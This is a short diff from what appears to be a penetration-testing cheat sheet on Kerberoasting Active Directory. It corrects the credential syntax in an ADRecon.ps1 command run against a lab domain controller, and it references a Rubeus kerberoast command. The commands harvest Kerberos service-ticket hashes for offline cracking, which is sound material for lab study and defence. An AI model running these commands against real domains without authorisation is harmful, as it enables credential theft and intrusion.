@@ -106,7 +106,7 @@ C:\AD\jfc-tools>Rubeus.exe kerberoast /nowrap
 Example 3 - Use the PowerShell script ADrecon.ps1 with the option 'Kerberoast'
 ========================================================================================
 
-PS C:\AD\jfc-tools> .\ADRecon.ps1 -Method ADWS -DomainController 192.168.1.50 -Credential security-Lab/user -Collect default,Kerberoast
+PS C:\AD\jfc-tools> .\ADRecon.ps1 -Method ADWS -DomainController 192.168.1.50 -Credential security-Lab\user -Collect default,Kerberoast
 
 [*] ADRecon v1.24 by Prashant Mahajan (@prashant3535)
 WARNING: [Invoke-ADRecon] ActiveDirectory Module from RSAT (Remote Server Administration Tools) is not installed ... Continuing with LDAP
